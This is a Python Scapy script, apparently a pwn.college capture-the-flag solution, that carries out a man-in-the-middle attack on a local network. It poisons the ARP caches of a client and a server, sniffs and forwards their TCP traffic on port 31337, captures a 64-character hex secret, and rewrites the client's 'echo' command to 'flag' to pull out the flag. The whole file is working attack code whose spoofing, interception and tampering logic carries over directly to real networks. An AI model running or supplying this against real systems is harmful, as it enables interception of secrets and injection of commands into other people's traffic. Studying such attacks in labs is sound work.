from scapy.all import *
import socket
import threading
import time

your_ip = "10.0.0.1"
client_ip = "10.0.0.2"
server_ip = "10.0.0.3"
server_port = 31337

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    return None

your_mac = get_if_hwaddr("eth0")
client_mac = get_mac(client_ip)
server_mac = get_mac(server_ip)

print(f"[+] Your MAC: {your_mac}")
print(f"[+] Client MAC: {client_mac}")
print(f"[+] Server MAC: {server_mac}")

intercepted_secret = None
secret_lock = threading.Lock()
flag_received = False

def arp_spoof():
    print("[+] Starting ARP spoofing...")
    while True:
        send(ARP(op=2, pdst=client_ip, hwdst=client_mac, psrc=server_ip, hwsrc=your_mac), verbose=False)
        send(ARP(op=2, pdst=server_ip, hwdst=server_mac, psrc=client_ip, hwsrc=your_mac), verbose=False)
        time.sleep(1)

def forward_packet(packet):
    global intercepted_secret, flag_received
    
    if IP in packet and TCP in packet:
        # From client to server
        if packet[IP].src == client_ip and packet[IP].dst == server_ip:
            if Raw in packet:
                data = packet[Raw].load
                
                try:
                    decoded = data.decode().strip()
                    if len(decoded) == 64 and all(c in '0123456789abcdef' for c in decoded):
                        with secret_lock:
                            if intercepted_secret is None:
                                intercepted_secret = decoded
                                print(f"\n{'='*60}")
                                print(f"[!] SECRET INTERCEPTED: {intercepted_secret}")
                                print(f"{'='*60}\n")
                except:
                    pass
                
                # Check if client is sending "echo" command - replace it with "flag"!
                if data == b"echo":
                    print(f"[*] Intercepted 'echo' command, replacing with 'flag'!")
                    packet[Raw].load = b"flag"
                    del packet[IP].len
                    del packet[IP].chksum
                    del packet[TCP].chksum
                    packet[Ether].src = your_mac
                    packet[Ether].dst = server_mac
                    sendp(packet, verbose=False, iface="eth0")
                    return
            
            packet[Ether].src = your_mac
            packet[Ether].dst = server_mac
            del packet[IP].chksum
            del packet[TCP].chksum
            sendp(packet, verbose=False, iface="eth0")
        
        # From server to client
        elif packet[IP].src == server_ip and packet[IP].dst == client_ip:
            if Raw in packet:
                data = packet[Raw].load
                # Check if this is the flag response
                try:
                    decoded = data.decode()
                    if not flag_received and len(decoded) > 5 and (decoded.startswith('flag{') or decoded.startswith('FLAG{') or decoded.startswith('pwn.college{')):
                        flag_received = True
                        print(f"\n{'='*60}")
                        print(f"[SUCCESS] FLAG: {decoded.strip()}")
                        print(f"{'='*60}\n")
                        import os
                        os._exit(0)
                except:
                    pass
            
            packet[Ether].src = your_mac
            packet[Ether].dst = client_mac
            del packet[IP].chksum
            del packet[TCP].chksum
            sendp(packet, verbose=False, iface="eth0")

spoof_thread = threading.Thread(target=arp_spoof, daemon=True)
spoof_thread.start()

print("[+] Waiting for ARP spoofing to establish...")
time.sleep(3)

print("[+] Starting packet interception...")
print("[+] Intercepting traffic and modifying 'echo' commands to 'flag'...\n")

try:
    sniff(prn=forward_packet, 
          filter=f"tcp port {server_port}",
          iface="eth0",
          store=False)
except KeyboardInterrupt:
    print("\n[!] Interrupted by user")
